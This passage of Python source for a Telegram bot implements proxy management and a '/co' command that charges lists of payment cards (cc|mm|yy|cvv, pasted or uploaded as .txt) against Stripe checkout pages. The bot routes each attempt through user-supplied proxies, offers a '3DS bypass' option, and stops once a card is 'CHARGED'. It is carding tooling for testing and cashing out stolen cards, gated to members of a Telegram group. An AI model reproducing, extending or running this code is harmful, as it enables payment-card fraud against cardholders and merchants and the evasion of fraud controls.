            result["time"] = round(time.perf_counter() - start, 2)
            logger.debug("Final: %s - %s (%ss)", result["status"], result["response"], result["time"])
            return result

    return result


# ═══════════════════════════════════════════════════════════════════════
#  Proxy health checking
# ═══════════════════════════════════════════════════════════════════════

async def _get_proxy_info(proxy_str: Optional[str] = None, timeout: int = 10) -> dict:
    """Check whether a proxy is alive and grab its external IP."""
    result = {
        "status": "dead",
        "ip": None,
        "ip_obfuscated": None,
        "country": None,
        "city": None,
        "org": None,
        "using_proxy": False,
    }

    proxy_url = None
    if proxy_str:
        proxy_url = _build_proxy_url(proxy_str)
        result["using_proxy"] = True

    try:
        async with aiohttp.ClientSession() as session:
            kwargs: dict = {"timeout": aiohttp.ClientTimeout(total=timeout)}
            if proxy_url:
                kwargs["proxy"] = proxy_url

            async with session.get("http://ip-api.com/json", **kwargs) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result["status"] = "alive"
                    result["ip"] = data.get("query")
                    result["ip_obfuscated"] = _obfuscate_ip(data.get("query"))
                    result["country"] = data.get("country")
                    result["city"] = data.get("city")
                    result["org"] = data.get("isp")
    except Exception:
        logger.debug("Proxy check failed for %s", proxy_str)

    return result


async def _check_single_proxy(proxy_str: str, timeout: int = 10) -> dict:
    """Check a single proxy, returning status and response time."""
    result = {
        "proxy": proxy_str,
        "status": "dead",
        "response_time": None,
        "external_ip": None,
        "error": None,
    }

    proxy_url = _build_proxy_url(proxy_str)
    if not proxy_url:
        result["error"] = "Invalid format"
        return result

    try:
        start = time.perf_counter()
        async with aiohttp.ClientSession() as session:
            async with session.get(
                "http://ip-api.com/json",
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=timeout),
            ) as resp:
                elapsed = round((time.perf_counter() - start) * 1000, 2)
                if resp.status == 200:
                    data = await resp.json()
                    result["status"] = "alive"
                    result["response_time"] = f"{elapsed}ms"
                    result["external_ip"] = data.get("query")
    except asyncio.TimeoutError:
        result["error"] = "Timeout"
    except Exception as e:
        result["error"] = str(e)[:30]

    return result


async def _check_proxies_batch(proxies: list, max_threads: int = 10) -> list:
    """Run proxy checks concurrently (bounded by semaphore)."""
    semaphore = asyncio.Semaphore(max_threads)

    async def check_with_semaphore(p: str):
        async with semaphore:
            return await _check_single_proxy(p)

    tasks = [check_with_semaphore(p) for p in proxies]
    return await asyncio.gather(*tasks)


# ═══════════════════════════════════════════════════════════════════════
#  Telegram command handlers
# ═══════════════════════════════════════════════════════════════════════

_ACCESS_DENIED = (
    "<blockquote><code>𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱 ❌</code></blockquote>\n\n"
    "<blockquote>「❃」 𝗝𝗼𝗶𝗻 𝘁𝗼 𝘂𝘀𝗲 : <code>https://t.me/+9B031Lv7m982MTc0</code></blockquote>"
)


@router.message(Command("addproxy"))
async def addproxy_handler(msg: Message) -> None:
    """Add proxies, checking aliveness before storing."""
    if not _check_access(msg):
        await msg.answer(_ACCESS_DENIED, parse_mode=ParseMode.HTML)
        return

    args = msg.text.split(maxsplit=1)
    user_id = msg.from_user.id
    user_proxies = _get_user_proxies(user_id)

    if len(args) < 2:
        # Show current list
        if user_proxies:
            proxy_list = "\n".join(f"    • <code>{p}</code>" for p in user_proxies[:10])
            if len(user_proxies) > 10:
                proxy_list += f"\n    • <code>... and {len(user_proxies) - 10} more</code>"
        else:
            proxy_list = "    • <code>None</code>"

        await msg.answer(
            "<blockquote><code>𝗣𝗿𝗼𝘅𝘆 𝗠𝗮𝗻𝗮𝗴𝗲𝗿 🔒</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗬𝗼𝘂𝗿 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ({len(user_proxies)}) :\n{proxy_list}</blockquote>\n\n"
            "<blockquote>「❃」 𝗔𝗱𝗱 : <code>/addproxy proxy</code>\n"
            "「❃」 𝗥𝗲𝗺𝗼𝘃𝗲 : <code>/removeproxy proxy</code>\n"
            "「❃」 𝗥𝗲𝗺𝗼𝘃𝗲 𝗔𝗹𝗹 : <code>/removeproxy all</code>\n"
            "「❃」 𝗖𝗵𝗲𝗰𝗸 : <code>/proxy check</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗙𝗼𝗿𝗺𝗮𝘁𝘀 :\n"
            "    • <code>host:port:user:pass</code>\n"
            "    • <code>user:pass@host:port</code>\n"
            "    • <code>host:port</code></blockquote>",
            parse_mode=ParseMode.HTML,
        )
        return

    proxy_input = args[1].strip()
    proxies_to_add = [p.strip() for p in proxy_input.split("\n") if p.strip()]

    if not proxies_to_add:
        await msg.answer(
            "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>No valid proxies provided</code></blockquote>",
            parse_mode=ParseMode.HTML,
        )
        return

    checking_msg = await msg.answer(
        "<blockquote><code>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ⏳</code></blockquote>\n\n"
        f"<blockquote>「❃」 𝗧𝗼𝘁𝗮𝗹 : <code>{len(proxies_to_add)}</code>\n"
        "「❃」 𝗧𝗵𝗿𝗲𝗮𝗱𝘀 : <code>10</code></blockquote>",
        parse_mode=ParseMode.HTML,
    )

    results = await _check_proxies_batch(proxies_to_add, max_threads=PROXY_CHECK_THREADS)

    alive_proxies = []
    dead_proxies = []

    for r in results:
        if r["status"] == "alive":
            alive_proxies.append(r)
            _add_user_proxy(user_id, r["proxy"])
        else:
            dead_proxies.append(r)

    response = f"<blockquote><code>𝗣𝗿𝗼𝘅𝘆 𝗖𝗵𝗲𝗰𝗸 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲 ✅</code></blockquote>\n\n"
    response += f"<blockquote>「❃」 𝗔𝗹𝗶𝘃𝗲 : <code>{len(alive_proxies)}/{len(proxies_to_add)} ✅</code>\n"
    response += f"「❃」 𝗗𝗲𝗮𝗱 : <code>{len(dead_proxies)}/{len(proxies_to_add)} ❌</code></blockquote>\n\n"

    if alive_proxies:
        response += "<blockquote>「❃」 𝗔𝗱𝗱𝗲𝗱 :\n"
        for p in alive_proxies[:5]:
            response += f"    • <code>{p['proxy']}</code> ({p['response_time']})\n"
        if len(alive_proxies) > 5:
            response += f"    • <code>... and {len(alive_proxies) - 5} more</code>\n"
        response += "</blockquote>"

    try:
        await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)
    except Exception:
        logger.exception("Failed to edit addproxy reply.")


@router.message(Command("removeproxy"))
async def removeproxy_handler(msg: Message) -> None:
    """Remove a specific proxy or all proxies."""
    if not _check_access(msg):
        await msg.answer(_ACCESS_DENIED, parse_mode=ParseMode.HTML)
        return

    args = msg.text.split(maxsplit=1)
    user_id = msg.from_user.id

    if len(args) < 2:
        await msg.answer(
            "<blockquote><code>𝗥𝗲𝗺𝗼𝘃𝗲 𝗣𝗿𝗼𝘅𝘆 🗑️</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗨𝘀𝗮𝗴𝗲 : <code>/removeproxy proxy</code>\n"
            "「❃」 𝗔𝗹𝗹 : <code>/removeproxy all</code></blockquote>",
            parse_mode=ParseMode.HTML,
        )
        return

    proxy_input = args[1].strip()

    if proxy_input.lower() == "all":
        user_proxies = _get_user_proxies(user_id)
        count = len(user_proxies)
        _remove_user_proxy(user_id, "all")
        await msg.answer(
            "<blockquote><code>𝗔𝗹𝗹 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 ✅</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 : <code>{count} proxies</code></blockquote>",
            parse_mode=ParseMode.HTML,
        )
        return

    if _remove_user_proxy(user_id, proxy_input):
        await msg.answer(
            "<blockquote><code>𝗣𝗿𝗼𝘅𝘆 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 ✅</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_input}</code></blockquote>",
            parse_mode=ParseMode.HTML,
        )
    else:
        await msg.answer(
            "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>Proxy not found</code></blockquote>",
            parse_mode=ParseMode.HTML,
        )


@router.message(Command("proxy"))
async def proxy_handler(msg: Message) -> None:
    """List proxies or check them for aliveness."""
    if not _check_access(msg):
        await msg.answer(_ACCESS_DENIED, parse_mode=ParseMode.HTML)
        return

    args = msg.text.split(maxsplit=1)
    user_id = msg.from_user.id

    # Just list
    if len(args) < 2 or args[1].strip().lower() != "check":
        user_proxies = _get_user_proxies(user_id)
        if user_proxies:
            proxy_list = "\n".join(f"    • <code>{p}</code>" for p in user_proxies[:10])
            if len(user_proxies) > 10:
                proxy_list += f"\n    • <code>... and {len(user_proxies) - 10} more</code>"
        else:
            proxy_list = "    • <code>None</code>"

        await msg.answer(
            "<blockquote><code>𝗣𝗿𝗼𝘅𝘆 𝗠𝗮𝗻𝗮𝗴𝗲𝗿 🔒</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗬𝗼𝘂𝗿 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ({len(user_proxies)}) :\n{proxy_list}</blockquote>\n\n"
            "<blockquote>「❃」 𝗖𝗵𝗲𝗰𝗸 𝗔𝗹𝗹 : <code>/proxy check</code></blockquote>",
            parse_mode=ParseMode.HTML,
        )
        return

    user_proxies = _get_user_proxies(user_id)

    if not user_proxies:
        await msg.answer(
            "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>No proxies to check</code>\n"
            "「❃」 𝗔𝗱𝗱 : <code>/addproxy proxy</code></blockquote>",
            parse_mode=ParseMode.HTML,
        )
        return

    checking_msg = await msg.answer(
        "<blockquote><code>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ⏳</code></blockquote>\n\n"
        f"<blockquote>「❃」 𝗧𝗼𝘁𝗮𝗹 : <code>{len(user_proxies)}</code>\n"
        "「❃」 𝗧𝗵𝗿𝗲𝗮𝗱𝘀 : <code>10</code></blockquote>",
        parse_mode=ParseMode.HTML,
    )

    results = await _check_proxies_batch(user_proxies, max_threads=PROXY_CHECK_THREADS)

    alive = [r for r in results if r["status"] == "alive"]
    dead = [r for r in results if r["status"] == "dead"]

    response = f"<blockquote><code>𝗣𝗿𝗼𝘅𝘆 𝗖𝗵𝗲𝗰𝗸 𝗥𝗲𝘀𝘂𝗹𝘁𝘀 📊</code></blockquote>\n\n"
    response += f"<blockquote>「❃」 𝗔𝗹𝗶𝘃𝗲 : <code>{len(alive)}/{len(user_proxies)} ✅</code>\n"
    response += f"「❃」 𝗗𝗲𝗮𝗱 : <code>{len(dead)}/{len(user_proxies)} ❌</code></blockquote>\n\n"

    if alive:
        response += "<blockquote>「❃」 𝗔𝗹𝗶𝘃𝗲 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 :\n"
        for p in alive[:5]:
            ip_display = p["external_ip"] or "N/A"
            response += f"    • <code>{p['proxy']}</code>\n      IP: {ip_display} | {p['response_time']}\n"
        if len(alive) > 5:
            response += f"    • <code>... and {len(alive) - 5} more</code>\n"
        response += "</blockquote>\n\n"

    if dead:
        response += "<blockquote>「❃」 𝗗𝗲𝗮𝗱 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 :\n"
        for p in dead[:3]:
            error = p.get("error", "Unknown")
            response += f"    • <code>{p['proxy']}</code> ({error})\n"
        if len(dead) > 3:
            response += f"    • <code>... and {len(dead) - 3} more</code>\n"
        response += "</blockquote>"

    try:
        await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)
    except Exception:
        logger.exception("Failed to edit proxy check reply.")


@router.message(Command("co"))
async def co_handler(msg: Message) -> None:
    """Charge cards against a Stripe checkout."""
    if not _check_access(msg):
        await msg.answer(_ACCESS_DENIED, parse_mode=ParseMode.HTML)
        return

    start_time = time.perf_counter()
    user_id = msg.from_user.id
    text = msg.text or ""
    lines = text.strip().split("\n")
    first_line = lines[0]

    # Strip command prefix
    if first_line.startswith("/co "):
        first_line = first_line[4:]
    elif first_line.startswith("/co"):
        first_line = first_line[3:]

    url = None
    bypass_3ds = True
    cards: list[dict] = []

    url = _extract_checkout_url(first_line)

    if url:
        remaining = first_line.replace(url, "").strip()
    else:
        await msg.answer(
            "<blockquote><code>𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 ⚡</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗨𝘀𝗮𝗴𝗲 : <code>/co url</code>\n"
            "「❃」 𝗖𝗵𝗮𝗿𝗴𝗲 : <code>/co url cc|mm|yy|cvv</code>\n"
            "「❃」 𝗕𝘆𝗽𝗮𝘀𝘀 : <code>/co url yes cc|mm|yy|cvv</code>\n"
            "「❃」 𝗠𝘂𝗹𝘁𝗶 : <code>/courl yes card1 card2 card3</code>\n"
            "「❃」 𝗙𝗶𝗹𝗲 : <code>Reply to .txt with /co url</code>\n"
            "「❃」 𝗙𝗶𝗹𝗲+𝗕𝘆𝗽𝗮𝘀𝘀 : <code>Reply to .txt with /co url yes</code></blockquote>",
            parse_mode=ParseMode.HTML,
        )
        return

    # Parse bypass flag and cards from the remaining text
    if remaining:
        remaining_lower = remaining.lower()
        for flag in ("yes", "no", " y ", " n "):
            if flag in (" " + remaining_lower + " "):
                bypass_3ds = flag.strip() in ("yes", "y")
                break
        else:
            if remaining_lower.startswith("y ") or remaining_lower.startswith("yes "):
                bypass_3ds = True
            elif remaining_lower.endswith(" y") or remaining_lower.endswith(" yes"):
                bypass_3ds = True
            elif remaining_lower.startswith("n ") or remaining_lower.startswith("no "):
                bypass_3ds = False
            elif remaining_lower.endswith(" n") or remaining_lower.endswith(" no"):
                bypass_3ds = False
            elif remaining_lower.strip() in ("yes", "y"):
                bypass_3ds = True
                remaining = ""
            elif remaining_lower.strip() in ("no", "n"):
                bypass_3ds = False
                remaining = ""

        remaining = re.sub(r"\b(yes|no)\b", "", remaining, flags=re.IGNORECASE).strip()
        remaining = re.sub(r"(?:^|\s)([yn])(?:\s|$)", " ", remaining, flags=re.IGNORECASE).strip()

        if remaining:
            cards = _parse_cards(remaining)

    # Also parse cards from subsequent lines
    if len(lines) > 1:
        cards.extend(_parse_cards("\n".join(lines[1:])))

    # Document attachment
    if msg.reply_to_message and msg.reply_to_message.document:
        doc = msg.reply_to_message.document
        if doc.file_name and doc.file_name.endswith(".txt"):
            try:
                file = await msg.bot.get_file(doc.file_id)
                file_content = await msg.bot.download_file(file.file_path)
                text_content = file_content.read().decode("utf-8")
                cards = _parse_cards(text_content)
            except Exception as e:
                await msg.answer(
                    "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
                    f"<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>Failed to read file: {str(e)}</code></blockquote>",
                    parse_mode=ParseMode.HTML,
                )
                return

    # Require a proxy
    user_proxy = _pick_random_proxy(user_id)

    if not user_proxy:
        await msg.answer(
            "<blockquote><code>𝗡𝗼 𝗣𝗿𝗼𝘅𝘆 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>You must set a proxy first</code>\n"
            "「❃」 𝗔𝗰𝘁𝗶𝗼𝗻 : <code>/addproxy host:port:user:pass</code></blockquote>",
            parse_mode=ParseMode.HTML,
        )
        return

    proxy_info = await _get_proxy_info(user_proxy)

    if proxy_info["status"] == "dead":
        await msg.answer(
            "<blockquote><code>𝗣𝗿𝗼𝘅𝘆 𝗗𝗲𝗮𝗱 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>Your proxy is not responding</code>\n"
            "「❃」 𝗔𝗰𝘁𝗶𝗼𝗻 : <code>Check /proxy or /removeproxy</code></blockquote>",
            parse_mode=ParseMode.HTML,
        )
        return

    proxy_display = f"LIVE ✅ | {proxy_info['ip_obfuscated']}"

    processing_msg = await msg.answer(
        "<blockquote><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 ⏳</code></blockquote>\n\n"
        f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
        "「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>Parsing checkout...</code></blockquote>",
        parse_mode=ParseMode.HTML,
    )

    checkout_data = await _get_checkout_info(url)

    if checkout_data.get("error"):
        try:
            await processing_msg.edit_text(
                "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
                f"<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>{checkout_data['error']}</code></blockquote>",
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            logger.exception("Failed to edit checkout error reply.")
        return

    # No cards – just show checkout info
    if not cards:
        currency = checkout_data.get("currency", "")
        sym = _get_currency_symbol(currency)
        price_str = f"{sym}{checkout_data['price']:.2f} {currency}" if checkout_data["price"] else "N/A"
        total_time = round(time.perf_counter() - start_time, 2)

        response = f"<blockquote><code>「 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 {price_str} 」</code></blockquote>\n\n"
        response += f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
        response += f"「❃」 𝗖𝗦 : <code>{checkout_data['cs'] or 'N/A'}</code>\n"
        response += f"「❃」 𝗣𝗞 : <code>{checkout_data['pk'] or 'N/A'}</code>\n"
        response += f"「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>SUCCESS ✅</code></blockquote>\n\n"

        response += f"<blockquote>「❃」 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁 : <code>{checkout_data['merchant'] or 'N/A'}</code>\n"
        response += f"「❃」 𝗣𝗿𝗼𝗱𝘂𝗰𝘁 : <code>{checkout_data['product'] or 'N/A'}</code>\n"
        response += f"「❃」 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : <code>{checkout_data['country'] or 'N/A'}</code>\n"
        response += f"「❃」 𝗠𝗼𝗱𝗲 : <code>{checkout_data['mode'] or 'N/A'}</code></blockquote>\n\n"

        if checkout_data["customer_name"] or checkout_data["customer_email"]:
            response += f"<blockquote>「❃」 𝗖𝘂𝘀𝘁𝗼𝗺𝗲𝗿 : <code>{checkout_data['customer_name'] or 'N/A'}</code>\n"
            response += f"「❃」 𝗘𝗺𝗮𝗶𝗹 : <code>{checkout_data['customer_email'] or 'N/A'}</code></blockquote>\n\n"

        if checkout_data["support_email"] or checkout_data["support_phone"]:
            response += f"<blockquote>「❃」 𝗦𝘂𝗽𝗽𝗼𝗿𝘁 : <code>{checkout_data['support_email'] or 'N/A'}</code>\n"
            response += f"「❃」 𝗣𝗵𝗼𝗻𝗲 : <code>{checkout_data['support_phone'] or 'N/A'}</code></blockquote>\n\n"

        if checkout_data["cards_accepted"]:
            response += f"<blockquote>「❃」 𝗖𝗮𝗿𝗱𝘀 : <code>{checkout_data['cards_accepted']}</code></blockquote>\n\n"

        if checkout_data["success_url"] or checkout_data["cancel_url"]:
            response += f"<blockquote>「❃」 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 : <code>{checkout_data['success_url'] or 'N/A'}</code>\n"
            response += f"「❃」 𝗖𝗮𝗻𝗰𝗲𝗹 : <code>{checkout_data['cancel_url'] or 'N/A'}</code></blockquote>\n\n"

        response += f"<blockquote>「❃」 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : <code>/co</code>\n"
        response += f"「❃」 𝗧𝗶𝗺𝗲 : <code>{total_time}s</code></blockquote>"

        try:
            await processing_msg.edit_text(response, parse_mode=ParseMode.HTML)
        except Exception:
            logger.exception("Failed to edit checkout info reply.")
        return

    # Charge cards
    bypass_str = "YES 🔓" if bypass_3ds else "NO 🔒"
    currency = checkout_data.get("currency", "")
    sym = _get_currency_symbol(currency)
    price_str = f"{sym}{checkout_data['price']:.2f} {currency}" if checkout_data["price"] else "N/A"

    try:
        await processing_msg.edit_text(
            f"<blockquote><code>「 𝗖𝗵𝗮𝗿𝗴𝗶𝗻𝗴 {price_str} 」</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
            f"「❃」 𝗕𝘆𝗽𝗮𝘀𝘀 : <code>{bypass_str}</code>\n"
            f"「❃」 𝗖𝗮𝗿𝗱𝘀 : <code>{len(cards)}</code>\n"
            f"「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>Starting...</code></blockquote>",
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        logger.exception("Failed to edit charging start reply.")

    results: list[dict] = []
    charged_card = None
    cancelled = False
    check_interval = 5
    last_update = time.perf_counter()

    for i, card in enumerate(cards):
        # Check if checkout is still active every N cards
        if len(cards) > 1 and i > 0 and i % check_interval == 0:
            is_active = await _check_checkout_active(checkout_data["pk"], checkout_data["cs"])
            if not is_active:
                cancelled = True
                break

        result = await _charge_card(card, checkout_data, user_proxy, bypass_3ds)
        results.append(result)

        # Periodic progress update
        if len(cards) > 1 and (time.perf_counter() - last_update) > 1.5:
            last_update = time.perf_counter()
            charged = sum(1 for r in results if r["status"] == "CHARGED")
            declined = sum(1 for r in results if r["status"] == "DECLINED")
            three_ds = sum(1 for r in results if r["status"] in ["3DS", "3DS SKIP"])
            errors = sum(1 for r in results if r["status"] in ["ERROR", "FAILED"])

            try:
                await processing_msg.edit_text(
                    f"<blockquote><code>「 𝗖𝗵𝗮𝗿𝗴𝗶𝗻𝗴 {price_str} 」</code></blockquote>\n\n"
                    f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
                    f"「❃」 𝗕𝘆𝗽𝗮𝘀𝘀 : <code>{bypass_str}</code>\n"
                    f"「❃」 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 : <code>{i+1}/{len(cards)}</code></blockquote>\n\n"
                    f"<blockquote>「❃」 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 : <code>{charged} ✅</code>\n"
                    f"「❃」 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 : <code>{declined} ❌</code>\n"
                    f"「❃」 𝟯𝗗𝗦 : <code>{three_ds} 🔐</code>\n"
                    f"「❃」 𝗘𝗿𝗿𝗼𝗿𝘀 : <code>{errors} ⚠️</code></blockquote>",
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                pass  # Ignore edit failures – we still finish the job

        if result["status"] == "CHARGED":
            charged_card = result
            break

    total_time = round(time.perf_counter() - start_time, 2)

    if cancelled:
        response = f"<blockquote><code>「 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 𝗖𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱 ⛔ 」</code></blockquote>\n\n"
        response += f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
        response += f"「❃」 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁 : <code>{checkout_data['merchant'] or 'N/A'}</code>\n"
        response += f"「❃」 𝗥𝗲𝗮𝘀𝗼𝗻 : <code>Checkout no longer active</code></blockquote>\n\n"

        charged = sum(1 for r in results if r["status"] == "CHARGED")
        declined = sum(1 for r in results if r["status"] == "DECLINED")
        three_ds = sum(1 for r in results if r["status"] in ["3DS", "3DS SKIP"])

        response += f"<blockquote>「❃」 𝗧𝗿𝗶𝗲𝗱 : <code>{len(results)}/{len(cards)} cards</code>\n"
        response += f"「❃」 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 : <code>{charged} ✅</code>\n"
        response += f"「❃」 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 : <code>{declined} ❌</code>\n"
        response += f"「❃」 𝟯𝗗𝗦 : <code>{three_ds} 🔐</code></blockquote>\n\n"

        response += f"<blockquote>「❃」 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : <code>/co</code>\n"
        response += f"「❃」 𝗧𝗼𝘁𝗮𝗹 𝗧𝗶𝗺𝗲 : <code>{total_time}s</code></blockquote>"

        try:
            await processing_msg.edit_text(response, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
        except Exception:
            logger.exception("Failed to edit cancelled reply.")
        return

    # Build final response
    response = f"<blockquote><code>「 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 {price_str} 」</code></blockquote>\n\n"
    response += f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
    response += f"「❃」 𝗕𝘆𝗽𝗮𝘀𝘀 : <code>{bypass_str}</code>\n"
    response += f"「❃」 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁 : <code>{checkout_data['merchant'] or 'N/A'}</code>\n"
    response += f"「❃」 𝗣𝗿𝗼𝗱𝘂𝗰𝘁 : <code>{checkout_data['product'] or 'N/A'}</code></blockquote>\n\n"

    if charged_card:
        response += f"<blockquote>「❃」 𝗖𝗮𝗿𝗱 : <code>{charged_card['card']}</code>\n"

        if charged_card.get("bypass_attempted"):
            if charged_card.get("bypass_success"):
                response += f"「❃」 𝟯𝗗𝗦 : <code>BYPASSED ✅</code>\n"
            else:
                response += f"「❃」 𝟯𝗗𝗦 : <code>BYPASS FAILED ❌</code>\n"

        response += f"「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>CHARGED ✅</code>\n"
        response += f"「❃」 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : <code>{charged_card['response']}</code>\n"
        response += f"「❃」 𝗧𝗶𝗺𝗲 : <code>{charged_card['time']}s</code></blockquote>\n\n"

        if checkout_data.get("success_url"):
            response += f"<blockquote>「❃」 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗨𝗥𝗟 : <a href=\"{checkout_data['success_url']}\">Open Success Page</a></blockquote>\n\n"

        response += f"<blockquote>「❃」 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 : <a href=\"{url}\">Open Checkout</a></blockquote>\n\n"

        if len(results) > 1:
            response += f"<blockquote>「❃」 𝗧𝗿𝗶𝗲𝗱 : <code>{len(results)}/{len(cards)} cards</code></blockquote>\n\n"

    elif len(results) == 1:
        r = results[0]

        if r["status"] == "CHARGED":
            status_emoji = "✅"
        elif r["status"] in ["3DS", "3DS FAIL"]:
            status_emoji = "🔐"
        elif r["status"] == "3DS SKIP":
            status_emoji = "🔓"
        elif r["status"] == "3DS BYPASS":
            status_emoji = "✅"
        elif r["status"] == "DECLINED":
            status_emoji = "❌"
        elif r["status"] == "NOT SUPPORTED":
            status_emoji = "🚫"
        else:
            status_emoji = "⚠️"

        response += f"<blockquote>「❃」 𝗖𝗮𝗿𝗱 : <code>{r['card']}</code>\n"

        if r.get("bypass_attempted"):
            if r.get("bypass_success"):
                response += f"「❃」 𝟯𝗗𝗦 : <code>BYPASSED ✅</code>\n"
            else:
                response += f"「❃」 𝟯𝗗𝗦 : <code>BYPASS FAILED ❌</code>\n"

        response += f"「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>{r['status']} {status_emoji}</code>\n"
        response += f"「❃」 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : <code>{r['response']}</code>\n"
        response += f"「❃」 𝗧𝗶𝗺𝗲 : <code>{r['time']}s</code></blockquote>\n\n"

    else:
        charged = sum(1 for r in results if r["status"] == "CHARGED")
        declined = sum(1 for r in results if r["status"] == "DECLINED")
        three_ds = sum(1 for r in results if r["status"] in ["3DS", "3DS SKIP", "3DS FAIL"])
        three_ds_bypass = sum(1 for r in results if r.get("bypass_success"))
        errors = sum(1 for r in results if r["status"] in ["ERROR", "FAILED", "UNKNOWN"])
        total = len(results)

        response += f"<blockquote>「❃」 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 : <code>{charged}/{total} ✅</code>\n"
        response += f"「❃」 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 : <code>{declined}/{total} ❌</code>\n"
        response += f"「❃」 𝟯𝗗𝗦 : <code>{three_ds}/{total} 🔐</code>\n"
        if three_ds_bypass:
            response += f"「❃」 𝟯𝗗𝗦 𝗕𝘆𝗽𝗮𝘀𝘀𝗲𝗱 : <code>{three_ds_bypass}/{total} ✅</code>\n"
        if errors:
            response += f"「❃」 𝗘𝗿𝗿𝗼𝗿𝘀 : <code>{errors}/{total} ⚠️</code>\n"
        response += f"</blockquote>\n\n"

    response += f"<blockquote>「❃」 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : <code>/co</code>\n"
    response += f"「❃」 𝗧𝗼𝘁𝗮𝗹 𝗧𝗶𝗺𝗲 : <code>{total_time}s</code></blockquote>"

    try:
        await processing_msg.edit_text(response, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    except Exception:
        logger.exception("Failed to edit final charge reply.")
